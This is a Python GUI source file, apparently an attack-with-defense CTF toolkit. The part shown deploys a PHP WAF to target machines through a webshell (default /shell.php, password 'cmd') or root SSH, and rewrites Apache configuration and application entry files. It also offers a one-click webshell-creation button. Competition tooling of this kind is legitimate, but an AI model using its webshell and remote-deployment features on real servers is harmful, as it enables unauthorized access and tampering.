#!/usr/bin/env python3
"""
AWD Toolkit v2.0 — 统一管理平台
集成: WAF管理 | Flag获取 | 靶机监控 | 木马上传 | 综合运维
"""
import os, sys, base64, json, ipaddress, time, re, threading, queue, ssl, subprocess
import urllib.request, urllib.parse, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
import requests
import tkinter as tk
from tkinter import scrolledtext, filedialog, messagebox, simpledialog, ttk
import ttkbootstrap as tb
from ttkbootstrap.constants import *
import socket
import hashlib
import shutil
import webbrowser
import ctypes

# ── Windows DPI 感知: 避免高DPI缩放下窗口被放大超出屏幕, 导致右侧按钮不可见 ──
if os.name == 'nt':
    try:
        ctypes.windll.shcore.SetProcessDpiAwareness(1)
    except Exception:
        try:
            ctypes.windll.user32.SetProcessDPIAware()
        except Exception:
            pass

if getattr(sys, 'frozen', False):
    BASE = sys._MEIPASS
    EXE_DIR = os.path.dirname(sys.executable)
else:
    BASE = os.path.dirname(os.path.abspath(__file__))
    EXE_DIR = BASE
CONFIG_DIR = os.path.join(EXE_DIR, '管理工具')

# ── 全局异常日志(诊断用: tkinter回调/工作线程的异常写入 exe 旁 yl_error.log) ──
import traceback as _tb

def _write_err(title, t, v, tb):
    try:
        with open(os.path.join(EXE_DIR, 'yl_error.log'), 'a', encoding='utf-8') as f:
            f.write('\n[%s] %s\n' % (time.strftime('%Y-%m-%d %H:%M:%S'), title))
            f.write(''.join(_tb.format_exception(t, v, tb)))
    except Exception:
        pass

def _sys_exc_hook(t, v, tb):
    _write_err('sys.excepthook', t, v, tb)

def _thr_exc_hook(args):
    _write_err('threading.excepthook', args.exc_type, args.exc_value, args.exc_traceback)

sys.excepthook = _sys_exc_hook
threading.excepthook = _thr_exc_hook
tk.Tk.report_callback_exception = lambda self, t, v, tb: _write_err('tk callback', t, v, tb)

# ── 公共工具 ──
def _try_add_path(base_path):
    if os.path.exists(os.path.join(base_path, '__init__.py')) or os.path.exists(base_path):
        sys.path.insert(0, base_path)
        return True
    return False

def _ensure_import(module_name, subdirs=None):
    if module_name in sys.modules:
        return sys.modules[module_name]
    meipass = getattr(sys, '_MEIPASS', '')
    candidates = [BASE] + ([meipass] if meipass else [])
    if subdirs:
        candidates = [os.path.join(p, subdirs) for p in candidates]
    for p in candidates:
        if os.path.isdir(p) or os.path.exists(os.path.join(os.path.dirname(p), module_name + '.py')):
            if p not in sys.path:
                sys.path.insert(0, p)
            break
    return __import__(module_name)

def _session():
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    return s

def make_base(ip, port, https):
    ip = str(ip).strip().strip('/')
    m = re.match(r'^(?:https?://)?(.+)$', ip, re.I)
    if m: ip = m.group(1)
    ip = ip.strip('/')
    proto = 'https' if https else 'http'
    if ':' in ip:
        return f'{proto}://{ip}'
    if https and port == 443: return f'{proto}://{ip}'
    if not https and port == 80: return f'{proto}://{ip}'
    return f'{proto}://{ip}:{port}'

def parse_targets(raw):
    ips = []
    if not raw: return ips
    for s in re.split(r'[,\s\n]+', raw):
        s = s.strip()
        if not s: continue
        try:
            for h in ipaddress.ip_network(s, strict=False).hosts(): ips.append(str(h))
        except (ValueError, TypeError):
            ips.append(s)
    return ips

def safe_int(val, default=0):
    try: return int(val)
    except (ValueError, TypeError): return default

def atomic_write(path, data):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    tmp = path + '.tmp'
    with open(tmp, 'w', encoding='utf-8') as f: f.write(data)
    if os.name == 'nt':
        if os.path.exists(path): os.remove(path)
    os.replace(tmp, path)

def async_run(target, daemon=True):
    threading.Thread(target=target, daemon=daemon).start()

def pick_dir(entry):
    p = filedialog.askdirectory()
    if p:
        entry.delete(0, tk.END)
        entry.insert(0, p)

CONFIG_FILE = os.path.join(EXE_DIR, '管理工具', 'app_config.json')
WAF_SIG_KEY_FILE = os.path.join(CONFIG_DIR, 'waf_key.txt')

def _get_waf_key():
    """全局随机 WAF 签名密钥(每台部署机独立, 持久化到 管理工具/waf_key.txt)"""
    if os.path.exists(WAF_SIG_KEY_FILE):
        try:
            k = open(WAF_SIG_KEY_FILE, 'r', encoding='utf-8').read().strip()
            if k:
                return k
        except Exception:
            pass
    import secrets
    k = secrets.token_hex(16)
    try:
        os.makedirs(os.path.dirname(WAF_SIG_KEY_FILE), exist_ok=True)
        with open(WAF_SIG_KEY_FILE, 'w', encoding='utf-8') as f:
            f.write(k)
    except Exception:
        pass
    return k

def render_waf_strong(key=None):
    """读取 waf_strong.php 模板并注入签名密钥(替换占位符)"""
    key = key or _get_waf_key()
    for p in [os.path.join(BASE, '上传靶机', 'waf_strong.php'),
              os.path.join(BASE, 'waf_strong.php'),
              os.path.join(os.path.dirname(sys.executable), '上传靶机', 'waf_strong.php'),
              os.path.join(os.path.dirname(sys.executable), 'waf_strong.php')]:
        if os.path.exists(p):
            with open(p, 'r', encoding='utf-8', errors='replace') as f:
                c = f.read()
            return c.replace('__YL_WAF_SIGKEY__', key)
    return None

def render_waf_ban(key=None):
    """读取 waf_ban.php 模板并注入签名密钥"""
    key = key or _get_waf_key()
    for p in [os.path.join(BASE, '上传靶机', 'waf_ban.php'),
              os.path.join(BASE, 'waf_ban.php'),
              os.path.join(os.path.dirname(sys.executable), '上传靶机', 'waf_ban.php'),
              os.path.join(os.path.dirname(sys.executable), 'waf_ban.php')]:
        if os.path.exists(p):
            with open(p, 'r', encoding='utf-8', errors='replace') as f:
                c = f.read()
            return c.replace('__YL_WAF_SIGKEY__', key)
    return None

def _waf_htaccess():
    """生成加固 .htaccess: 禁止HTTP访问 WAF 配置/日志/黑名单脚本, mod_php下全局auto_prepend"""
    return ('# YL WAF 加固\n'
            '<FilesMatch "^\\.waf\\.(dat|log)">\n'
            '  Require all denied\n'
            '  Deny from all\n'
            '</FilesMatch>\n'
            '<FilesMatch "^\\.waf\\.dat\\.php$">\n'
            '  Require all denied\n'
            '  Deny from all\n'
            '</FilesMatch>\n'
            '<FilesMatch "^waf_ban\\.php$">\n'
            '  Require all denied\n'
            '  Deny from all\n'
            '</FilesMatch>\n'
            'php_value auto_prepend_file waf_strong.php\n')

class ConfigManager:
    """统一配置管理器 — 所有tab配置集中存储"""
    _data = {}
    _loaded = False

    @classmethod
    def _ensure(cls):
        if not cls._loaded:
            if os.path.exists(CONFIG_FILE):
                try:
                    with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                        cls._data = json.load(f)
                except (json.JSONDecodeError, OSError, ValueError):
                    cls._data = {}
            else:
                cls._data = {}
            cls._loaded = True

    @classmethod
    def get(cls, section, key, default=None):
        cls._ensure()
        return cls._data.get(section, {}).get(key, default)

    @classmethod
    def set(cls, section, key, value):
        cls._ensure()
        if section not in cls._data:
            cls._data[section] = {}
        cls._data[section][key] = value

    @classmethod
    def get_section(cls, section):
        cls._ensure()
        return cls._data.get(section, {})

    @classmethod
    def set_section(cls, section, data):
        cls._ensure()
        cls._data[section] = data

    @classmethod
    def save(cls):
        os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
        atomic_write(CONFIG_FILE, json.dumps(cls._data, indent=2, ensure_ascii=False))

def ssh_deploy_dialog(parent, title, desc, fields, on_deploy):
    """通用 SSH 一键部署弹窗"""
    win = tk.Toplevel(parent)
    win.title(title)
    win.geometry('450x300')
    win.transient(parent)
    win.grab_set()
    win.configure(bg='#070b14')
    tk.Label(win, text=title, fg='#00d4ff', bg='#070b14',
        font=('微软雅黑', 11, 'bold')).pack(pady=(12,8))
    tk.Label(win, text=desc, fg='#6b7f9e', bg='#070b14',
        font=('微软雅黑', 9)).pack()
    form = tk.Frame(win, bg='#070b14')
    form.pack(padx=20, pady=10, fill=tk.X)
    vd = {}
    for label, key, default, show in fields:
        row = tk.Frame(form, bg='#070b14')
        row.pack(fill=tk.X, pady=2)
        tk.Label(row, text=label, fg='#d6e4ff', bg='#070b14', width=10, anchor=tk.W, font=('微软雅黑', 9)).pack(side=tk.LEFT)
        var = tk.StringVar(value=default)
        vd[key] = var
        tk.Entry(row, textvariable=var, width=28, bg='#111c33', fg='#d6e4ff',
            insertbackground='#d6e4ff', relief=tk.FLAT, font=('Consolas', 9), show=show).pack(side=tk.LEFT, padx=4)
    def do_it():
        vals = {k: v.get().strip() for k, v in vd.items()}
        has_ssh = bool(vals.get('host')) or bool(vals.get('pwd'))
        has_ws = bool(vals.get('sh_url')) and bool(vals.get('sh_pass'))
        if has_ssh and not (vals.get('host') and vals.get('pwd')):
            messagebox.showerror("错误", "SSH地址和密码需同时填写"); return
        if not has_ssh and not has_ws:
            messagebox.showerror("错误", "请填写 SSH地址+密码，或 Shell路径+密码 二选一"); return
        win.destroy()
        on_deploy(vals)
    tk.Button(win, text='🚀 开始部署', command=do_it, bg='#00ff9d', fg='#04121a',
        relief=tk.FLAT, bd=0, padx=20, pady=6, cursor='hand2', font=('微软雅黑', 10, 'bold'),
        activebackground='#00ff9d').pack(pady=10)

def pick_file(entry):
    p = filedialog.askopenfilename()
    if p: entry.delete(0, tk.END); entry.insert(0, p)

# ── 共享日志组件 ──
class LogWidget:
    def __init__(self, parent, height=None):
        self.text = scrolledtext.ScrolledText(parent, font=('Consolas', 9), bg='#0a0e17',
            fg='#c8d6f0', insertbackground='#00d4ff', state=tk.DISABLED, height=height,
            relief=tk.FLAT, bd=0, highlightthickness=1, highlightcolor='#1b2a4a', highlightbackground='#1b2a4a')
        self.text.pack(fill=tk.BOTH, expand=True)
        for t, c in [('ok','#00ff9d'),('fail','#ff4d6d'),('info','#00d4ff'),('warn','#ffcc00'),('title','#c084fc'),('out','#c8d6f0')]:
            self.text.tag_config(t, foreground=c)
        self.search_var = tk.StringVar()
        self._search_visible = False

    def log(self, msg, tag='info'):
        self.text.config(state=tk.NORMAL)
        self.text.insert(tk.END, msg + '\n', tag)
        self.text.see(tk.END)
        self.text.config(state=tk.DISABLED)

    def clear(self):
        self.text.config(state=tk.NORMAL)
        self.text.delete('1.0', tk.END)
        self.text.config(state=tk.DISABLED)

    def add_search_bar(self, parent):
        f = tb.Frame(parent)
        tb.Label(f, text='搜索:').pack(side=tk.LEFT)
        e = tb.Entry(f, textvariable=self.search_var, width=20)
        e.pack(side=tk.LEFT, padx=2)
        tb.Button(f, text='🔍', command=self._do_search, width=3).pack(side=tk.LEFT)
        tb.Button(f, text='✕', command=self._clear_search, width=3).pack(side=tk.LEFT)
        return f

    def _do_search(self):
        kw = self.search_var.get().strip()
        if not kw: return
        self.text.config(state=tk.NORMAL)
        self.text.tag_remove('search', '1.0', tk.END)
        pos = '1.0'
        count = 0
        while True:
            pos = self.text.search(kw, pos, tk.END, nocase=True)
            if not pos: break
            end = f'{pos}+{len(kw)}c'
            self.text.tag_add('search', pos, end)
            self.text.tag_config('search', background='#e06c00', foreground='white')
            pos = end
            count += 1
        self.text.config(state=tk.DISABLED)
        if not count: self.log(f'未找到: {kw}', 'warn')

    def _clear_search(self):
        self.search_var.set('')
        self.text.tag_remove('search', '1.0', tk.END)


# ============================================================
#  Tab 1: WAF 管理 (修复: 裸except + 线程清理)
# ============================================================
WAF_FILE = os.path.join(BASE, '上传靶机', 'waf_strong.php')
DAT_FILE = os.path.join(BASE, '上传靶机', '.waf.dat')

class WafTab:
    def __init__(self, parent, log_func):
        self.parent = parent
        self.log = log_func
        self.running = False
        self.results = []
        self._threads = []
        self.cfg = self.load_config()
        self.build_ui()

    def load_config(self):
        d = ConfigManager.get_section('waf')
        # 默认密码改为 cmd，不再硬编码 y|lladmin121.@ss
        defaults = {'shell_url': '/shell.php', 'shell_pass': 'cmd', 'port': 80,
             'https': False, 'threads': 20, 'timeout': 10, 'retry': 2,
             'strength': '标准', 'whitelist': ''}
        for k, v in defaults.items():
            d.setdefault(k, v)
        return d

    def save_config(self):
        ConfigManager.set_section('waf', {
            'shell_url': self.e_shell_url.get(), 'shell_pass': self.e_shell_pass.get(),
            'port': int(self.e_port.get()), 'https': self.v_https.get(),
            'threads': int(self.e_threads.get()), 'timeout': int(self.e_timeout.get()),
            'retry': int(self.e_retry.get()),
            'conn_mode': self.conn_mode.get(),
            'ssh_host': self.e_ssh_host.get(), 'ssh_port': self.e_ssh_port.get(),
            'ssh_user': self.e_ssh_user.get(), 'ssh_pass': self.e_ssh_pass.get(),
            'ssh_webdir': self.e_ssh_webdir.get(),
            'strength': self.strength.get(), 'whitelist': self.e_whitelist.get(),
        })
        ConfigManager.save()

    def build_ui(self):
        f = tk.Frame(self.parent, bg=MON_CK['bg'])
        f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        top = tb.LabelFrame(f, text='目标配置', padding=6)
        top.pack(fill=tk.X)
        # ── 连接模式选择 ──
        r_mode = tk.Frame(top, bg=MON_CK['card_bg'])
        r_mode.pack(fill=tk.X, pady=(0,4))
        tk.Label(r_mode, text='连接模式:', fg=MON_CK['text_dim'], bg=MON_CK['card_bg'],
            font=('微软雅黑', 9)).pack(side=tk.LEFT, padx=(4,2))
        self.conn_mode = tk.StringVar(value='webshell')
        for val, txt in [('webshell', '🌐 WebShell'), ('ssh', '🔑 SSH')]:
            tk.Radiobutton(r_mode, text=txt, variable=self.conn_mode, value=val,
                command=self._switch_conn_mode, fg=MON_CK['text'], bg=MON_CK['card_bg'],
                selectcolor='#111c33', font=('微软雅黑', 9)).pack(side=tk.LEFT, padx=6)
        # ── 防护强度配置 ──
        r_strength = tk.Frame(top, bg=MON_CK['card_bg'])
        r_strength.pack(fill=tk.X, pady=(0,4))
        tk.Label(r_strength, text='防护强度:', fg=MON_CK['text_dim'], bg=MON_CK['card_bg'],
            font=('微软雅黑', 9)).pack(side=tk.LEFT, padx=(4,2))
        self.strength = ttk.Combobox(r_strength, values=['标准', '严格', '白名单模式'], width=10, state='readonly')
        self.strength.set(self.cfg.get('strength', '标准'))
        self.strength.pack(side=tk.LEFT)
        tk.Label(r_strength, text=' 白名单IP(逗号分隔):', fg=MON_CK['text_dim'], bg=MON_CK['card_bg'],
            font=('微软雅黑', 9)).pack(side=tk.LEFT, padx=(8,2))
        self.e_whitelist = tb.Entry(r_strength, width=26)
        self.e_whitelist.insert(0, self.cfg.get('whitelist', ''))
        self.e_whitelist.pack(side=tk.LEFT, padx=2)
        tk.Label(r_strength, text='(部署时自动加入本机公网IP)', fg='#7c5cff', bg=MON_CK['card_bg'],
            font=('微软雅黑', 8)).pack(side=tk.LEFT, padx=4)
        # ── WebShell 模式面板 ──
        self.ws_frame = tk.Frame(top, bg=MON_CK['card_bg'])
        self.ws_frame.pack(fill=tk.X, pady=2)
        tk.Label(self.ws_frame, text='Webshell路径:', fg=MON_CK['text_dim'], bg=MON_CK['card_bg']).pack(side=tk.LEFT)
        self.e_shell_url = tb.Entry(self.ws_frame, width=18)
        self.e_shell_url.insert(0, self.cfg.get('shell_url', '/shell.php')); self.e_shell_url.pack(side=tk.LEFT, padx=2)
        tk.Label(self.ws_frame, text='密码:', fg=MON_CK['text_dim'], bg=MON_CK['card_bg']).pack(side=tk.LEFT, padx=(8,0))
        self.e_shell_pass = tb.Entry(self.ws_frame, width=16)
        self.e_shell_pass.insert(0, self.cfg.get('shell_pass', 'cmd')); self.e_shell_pass.pack(side=tk.LEFT, padx=2)
        tb.Button(self.ws_frame, text='\U0001f441', command=self.toggle_pass, width=3).pack(side=tk.LEFT)
        tk.Label(self.ws_frame, text='端口:', fg=MON_CK['text_dim'], bg=MON_CK['card_bg']).pack(side=tk.LEFT, padx=(8,0))
        self.e_port = tb.Entry(self.ws_frame, width=6); self.e_port.insert(0, str(self.cfg.get('port', 80)))
        self.e_port.pack(side=tk.LEFT, padx=2)
        self.v_https = tk.BooleanVar(value=self.cfg.get('https', False))
        tb.Checkbutton(self.ws_frame, text='HTTPS', variable=self.v_https).pack(side=tk.LEFT, padx=4)
        tk.Label(self.ws_frame, text='并发:', fg=MON_CK['text_dim'], bg=MON_CK['card_bg']).pack(side=tk.LEFT, padx=(8,0))
        self.e_threads = tb.Entry(self.ws_frame, width=5); self.e_threads.insert(0, str(self.cfg.get('threads', 20)))
        self.e_threads.pack(side=tk.LEFT, padx=2)
        tk.Label(self.ws_frame, text='超时:', fg=MON_CK['text_dim'], bg=MON_CK['card_bg']).pack(side=tk.LEFT, padx=(8,0))
        self.e_timeout = tb.Entry(self.ws_frame, width=4); self.e_timeout.insert(0, str(self.cfg.get('timeout', 10)))
        self.e_timeout.pack(side=tk.LEFT, padx=2)
        tk.Label(self.ws_frame, text='重试:', fg=MON_CK['text_dim'], bg=MON_CK['card_bg']).pack(side=tk.LEFT, padx=(8,0))
        self.e_retry = tb.Entry(self.ws_frame, width=3); self.e_retry.insert(0, str(self.cfg.get('retry', 2)))
        self.e_retry.pack(side=tk.LEFT, padx=2)
        # ── SSH 模式面板 ──
        self.ssh_frame = tk.Frame(top, bg=MON_CK['card_bg'])
        tk.Label(self.ssh_frame, text='SSH地址(空=目标):', fg=MON_CK['text_dim'], bg=MON_CK['card_bg']).pack(side=tk.LEFT, padx=(4,2))
        self.e_ssh_host = tb.Entry(self.ssh_frame, width=18)
        self.e_ssh_host.insert(0, self.cfg.get('ssh_host', '')); self.e_ssh_host.pack(side=tk.LEFT, padx=2)
        tk.Label(self.ssh_frame, text='端口:', fg=MON_CK['text_dim'], bg=MON_CK['card_bg']).pack(side=tk.LEFT, padx=(8,0))
        self.e_ssh_port = tb.Entry(self.ssh_frame, width=6)
        self.e_ssh_port.insert(0, str(self.cfg.get('ssh_port', '22'))); self.e_ssh_port.pack(side=tk.LEFT, padx=2)
        tk.Label(self.ssh_frame, text='用户名:', fg=MON_CK['text_dim'], bg=MON_CK['card_bg']).pack(side=tk.LEFT, padx=(8,0))
        self.e_ssh_user = tb.Entry(self.ssh_frame, width=12)
        self.e_ssh_user.insert(0, self.cfg.get('ssh_user', 'root')); self.e_ssh_user.pack(side=tk.LEFT, padx=2)
        tk.Label(self.ssh_frame, text='密码:', fg=MON_CK['text_dim'], bg=MON_CK['card_bg']).pack(side=tk.LEFT, padx=(8,0))
        self.e_ssh_pass = tb.Entry(self.ssh_frame, width=16)
        self.e_ssh_pass.insert(0, self.cfg.get('ssh_pass', '')); self.e_ssh_pass.pack(side=tk.LEFT, padx=2)
        tk.Label(self.ssh_frame, text='Web目录:', fg=MON_CK['text_dim'], bg=MON_CK['card_bg']).pack(side=tk.LEFT, padx=(8,0))
        self.e_ssh_webdir = tb.Entry(self.ssh_frame, width=16)
        self.e_ssh_webdir.insert(0, self.cfg.get('ssh_webdir', '/var/www/html')); self.e_ssh_webdir.pack(side=tk.LEFT, padx=2)
        # 隐藏 SSH 面板
        self.ssh_frame.pack_forget()
        # ── 目标与操作 ──
        mid = tb.LabelFrame(f, text='目标与操作', padding=6)
        mid.pack(fill=tk.X, pady=4)
        r1 = tb.Frame(mid); r1.pack(fill=tk.X)
        tb.Label(r1, text='IP/网段/文件:').pack(side=tk.LEFT)
        self.e_target = tb.Entry(r1)
        self.e_target.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Button(r1, text='\U0001f4c2 浏览', command=self.browse_file).pack(side=tk.LEFT)
        r2 = tb.Frame(mid); r2.pack(fill=tk.X, pady=4)
        self.btn_deploy = tb.Button(r2, text='\u25b6 部署WAF', command=lambda: self.start('deploy'))
        self.btn_deploy.pack(side=tk.LEFT, padx=2)
        self.btn_check = tb.Button(r2, text='\U0001f50d 检查状态', command=lambda: self.start('check'))
        self.btn_check.pack(side=tk.LEFT, padx=2)
        self.btn_update = tb.Button(r2, text='\U0001f504 更新WAF', command=lambda: self.start('update'))
        self.btn_update.pack(side=tk.LEFT, padx=2)
        self.btn_remove = tb.Button(r2, text='\u274c 卸载WAF', command=lambda: self.start('remove'))
        self.btn_remove.pack(side=tk.LEFT, padx=2)
        self.btn_stop_waf = tb.Button(r2, text='\u23f9 停止', command=self.stop)
        self.btn_stop_waf.pack(side=tk.LEFT, padx=10)
        # 一键部署按钮
        r2b = tb.Frame(mid); r2b.pack(fill=tk.X, pady=(0,4))
        tk.Label(r2b, text='💡 首次使用需先部署WAF文件到靶机，点击下方按钮通过SSH一键部署',
            fg='#7c5cff', bg=MON_CK['bg'], font=('微软雅黑', 8)).pack(side=tk.LEFT, padx=4)
        self.btn_ssh_deploy_waf = tk.Button(r2b, text='🚀 SSH一键部署WAF文件', command=self.ssh_deploy_waf,
            bg='#7c5cff', fg='white', relief=tk.FLAT, bd=0, padx=10, pady=2, cursor='hand2',
            font=('微软雅黑', 9), activebackground='#d35400')
        self.btn_ssh_deploy_waf.pack(side=tk.RIGHT, padx=4)
        tk.Button(r2b, text='🌐 一键创建Webshell', command=self.ssh_create_shell,
            bg='#1f6feb', fg='white', relief=tk.FLAT, bd=0, padx=10, pady=2, cursor='hand2',
            font=('微软雅黑', 9), activebackground='#1158c7').pack(side=tk.RIGHT, padx=4)
        # ── 高级子标签页 ──
        bot_nb = tb.Notebook(f)
        bot_nb.pack(fill=tk.BOTH, expand=True, pady=(4,0))

        # 子页1: 执行日志
        bot_log = tb.Frame(bot_nb); bot_nb.add(bot_log, text='  \U0001f4dd 执行日志  ')
        self.log_w = LogWidget(bot_log)
        sf = self.log_w.add_search_bar(bot_log)
        sf.pack(fill=tk.X, pady=2)

        # 子页2: 规则编辑
        bot_rule = tb.Frame(bot_nb); bot_nb.add(bot_rule, text='  \U0001f4c4 规则编辑  ')
        tb.Label(bot_rule, text='编辑 WAF 规则内容 (保存后需重新部署):', font=('微软雅黑', 9)).pack(anchor=tk.W, padx=4, pady=2)
        r_top = tb.Frame(bot_rule); r_top.pack(fill=tk.X, padx=4)
        self.btn_load_rules = tb.Button(r_top, text='\U0001f4c2 加载当前规则', command=self.load_rules, width=14)
        self.btn_load_rules.pack(side=tk.LEFT, padx=2)
        self.btn_save_rules = tb.Button(r_top, text='\U0001f4be 保存规则', command=self.save_rules, bootstyle='success', width=12)
        self.btn_save_rules.pack(side=tk.LEFT, padx=2)
        self.rule_text = tk.Text(bot_rule, font=('Consolas', 9), bg='#0a0e17', fg='#c8d6f0',
            insertbackground='white', height=8, wrap=tk.WORD, bd=0, highlightthickness=1, highlightcolor='#1b2a4a')
        self.rule_text.pack(fill=tk.BOTH, expand=True, padx=4, pady=2)

        # 子页3: 攻击流量
        bot_traf = tb.Frame(bot_nb); bot_nb.add(bot_traf, text='  \U0001f4e1 攻击流量  ')
        trf_top = tb.Frame(bot_traf); trf_top.pack(fill=tk.X, padx=4, pady=2)
        self.btn_traf = tb.Button(trf_top, text='\U0001f50d 获取攻击日志', command=self.fetch_traffic, width=16)
        self.btn_traf.pack(side=tk.LEFT, padx=2)
        tb.Label(trf_top, text='日志路径:').pack(side=tk.LEFT, padx=(8,0))
        self.e_logpath = tb.Entry(trf_top, width=30)
        self.e_logpath.insert(0, '/var/log/nginx/access.log')
        self.e_logpath.pack(side=tk.LEFT, padx=2, fill=tk.X, expand=True)
        self.traf_text = scrolledtext.ScrolledText(bot_traf, font=('Consolas', 9), bg='#0a0e17',
            fg='#c8d6f0', height=8, state=tk.DISABLED)
        self.traf_text.pack(fill=tk.BOTH, expand=True, padx=4, pady=2)
        for t, c in [('ip','#ff4d6d'),('info','#c8d6f0'),('cnt','#00ff9d')]:
            self.traf_text.tag_config(t, foreground=c)

        # 子页4: 心跳监控
        bot_hb = tb.Frame(bot_nb); bot_nb.add(bot_hb, text='  \u2764\ufe0f 心跳监控  ')
        hb_top = tb.Frame(bot_hb); hb_top.pack(fill=tk.X, padx=4, pady=2)
        self.hb_running = False
        self.btn_hb = tb.Button(hb_top, text='\u25b6 开始心跳', command=self.toggle_heartbeat, width=14)
        self.btn_hb.pack(side=tk.LEFT, padx=2)
        tb.Label(hb_top, text='间隔:').pack(side=tk.LEFT, padx=(8,0))
        self.hb_interval = tb.Entry(hb_top, width=4); self.hb_interval.insert(0, '30'); self.hb_interval.pack(side=tk.LEFT, padx=2)
        tb.Label(hb_top, text='秒').pack(side=tk.LEFT)
        self.hb_lbl = tb.Label(hb_top, text='\u23f8 未启动', foreground='#6b7f9e')
        self.hb_lbl.pack(side=tk.LEFT, padx=12)
        self.hb_text = scrolledtext.ScrolledText(bot_hb, font=('Consolas', 9), bg='#0a0e17',
            fg='#c8d6f0', height=8, state=tk.DISABLED)
        self.hb_text.pack(fill=tk.BOTH, expand=True, padx=4, pady=2)
        for t, c in [('alive','#00ff9d'),('dead','#ff4d6d'),('info','#c8d6f0')]:
            self.hb_text.tag_config(t, foreground=c)

    def toggle_pass(self):
        current = self.e_shell_pass.cget('show')
        self.e_shell_pass.config(show='' if current else '*')

    def _get_public_ip(self, timeout=2):
        import urllib.request
        for url in ('http://ip.sb', 'http://ident.me', 'http://ip.3322.net', 'https://api.ipify.org'):
            try:
                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                return urllib.request.urlopen(req, timeout=timeout).read().decode('utf-8', 'replace').strip()
            except Exception:
                continue
        return ''

    def build_waf_dat(self, strength=None, whitelist=None, admin_pass=None):
        """生成带强度/白名单/管理密码的 .waf.dat 内容(新格式带HMAC签名防篡改)
        签名密钥与 waf_strong.php/waf_ban.php 使用同一个随机密钥(见 _get_waf_key)"""
        import base64, json as _json, hmac as _hmac, hashlib, secrets as _secrets
        SIGKEY = _get_waf_key().encode()
        raw = None
        for p in (os.path.join(BASE, '上传靶机', '.waf.dat'), os.path.join(BASE, '.waf.dat'),
                  os.path.join(os.path.dirname(sys.executable), '上传靶机', '.waf.dat')):
            if os.path.exists(p):
                with open(p, 'rb') as f: raw = f.read()
                break
        if raw is None:
            return None
        b64 = raw.decode('utf-8', 'replace')
        head = '<?php $K="'
        if not b64.startswith(head):
            return raw
        inner = b64[len(head):].rsplit('";', 1)[0].rsplit('#SIG=', 1)[0]
        try:
            d = _json.loads(base64.b64decode(inner).decode('utf-8'))
        except Exception:
            return raw
        sval = strength if strength is not None else getattr(self, 'strength', None)
        if sval is None:
            sval = '标准'
        try:
            sval = sval.get()
        except AttributeError:
            pass
        d['S'] = {'标准': 1, '严格': 2, '白名单模式': 3}.get(sval, 1)
        wlist = whitelist if whitelist is not None else getattr(self, 'e_whitelist', None)
        if wlist is not None:
            try:
                wlist = wlist.get()
            except AttributeError:
                pass
        allow = [x.strip() for x in str(wlist or '').replace('，', ',').split(',') if x.strip()]
        if d['S'] == 3 or allow:
            myip = self._get_public_ip()
            if myip:
                allow.append(myip)
        d['W'] = sorted(set(allow))
        if admin_pass is None:
            admin_pass = d.get('P')
        if not admin_pass:
            admin_pass = 'yl' + _secrets.token_hex(8)
            d['P'] = admin_pass
        else:
            d['P'] = admin_pass
        payload = base64.b64encode(_json.dumps(d, ensure_ascii=False).encode('utf-8')).decode()
        sig = _hmac.new(SIGKEY, payload.encode('utf-8'), hashlib.sha256).hexdigest()
        return '<?php $K="' + payload + '";#SIG=' + sig

    def _switch_conn_mode(self):
        if self.conn_mode.get() == 'ssh':
            self.ws_frame.pack_forget()
            self.ssh_frame.pack(fill=tk.X, pady=2)
        else:
            self.ssh_frame.pack_forget()
            self.ws_frame.pack(fill=tk.X, pady=2)

    def _auto_mount_waf(self, ssh, web):
        """mod_php 下 .user.ini 不生效，自动把 WAF 挂载到业务入口（如 common.inc.php）
        检测: mods-enabled 的 php*.load / apache2ctl -M 有 php 模块 = mod_php 需挂载
              php-fpm 进程存在 = .user.ini 生效无需挂载
        """
        import time
        web = (web or '').rstrip('/')
        info = ''
        try:
            _, so, _ = ssh.exec_command(
                "ls /etc/apache2/mods-enabled/ 2>/dev/null | grep -Ei '^php[0-9]*\\.load'; "
                "apache2ctl -M 2>/dev/null | grep -i 'php[0-9]*_module'; "
                "ps aux 2>/dev/null | grep -i 'php-fpm' | grep -v grep | head -1", timeout=10)
            so.channel.settimeout(10)
            info = (so.read().decode('utf-8', 'replace') or '').strip()
        except Exception:
            pass
        mod_php = 'php' in info.lower()
        has_fpm = 'php-fpm' in info.lower()
        if has_fpm and not mod_php:
            return '[SKIP] 检测到 PHP-FPM，.user.ini 生效，无需入口挂载'
        if not mod_php and not has_fpm:
            return '[WARN] 无法确认PHP运行模式，保守挂载入口(与.user.ini双保险)'
        # ── mod_php: 优先在 Apache 配置注入 auto_prepend_file(覆盖所有PHP脚本, 不依赖业务代码require) ──
        apache_ok = False
        if mod_php:
            try:
                waf_path = web + '/waf_strong.php'
                dir_line = '<Directory "%s">\n  php_admin_value auto_prepend_file "%s"\n</Directory>\n' % (web, waf_path)
                _, so, _ = ssh.exec_command(
                    "grep -q 'php_admin_value auto_prepend_file' /etc/apache2/apache2.conf 2>/dev/null; echo $?", timeout=8)
                so.channel.settimeout(8)
                if (so.read().decode('utf-8', 'replace') or '').strip() != '0':
                    try:
                        with ssh.open_sftp() as sf:
                            with sf.open('/etc/apache2/apache2.conf', 'a') as f:
                                f.write('\n# YL WAF global auto_prepend\n' + dir_line)
                        ssh.exec_command('apachectl -t 2>/dev/null && (service apache2 reload 2>/dev/null || apachectl graceful 2>/dev/null); echo RELOAD_DONE')
                        apache_ok = True
                    except Exception:
                        apache_ok = False
            except Exception:
                apache_ok = False
            if apache_ok:
                return '[OK] mod_php全局注入成功 → Apache auto_prepend_file 已配置, 覆盖所有PHP脚本(含独立webshell)'
        # ── 入口 require 挂载(兜底) ──
        entries = ['common.inc.php', 'conn.php', 'config.php', 'init.php', 'db.php',
                   'include/conn.php', 'include/config.php', 'include/init.php',
                   'includes/config.php', 'inc/config.php',
                   'sqlgunadmin/downlog.php', 'downlog.php', 'admin/downlog.php',
                   'download.php', 'down.php', 'admin/download.php']
        mounted = []
        already = []
        try:
            sftp = ssh.open_sftp()
            for name in entries:
                p = web + '/' + name
                try:
                    with sftp.open(p, 'r') as f:
                        content = f.read().decode('utf-8', 'replace')
                except Exception:
                    continue
                if 'waf_strong.php' in content:
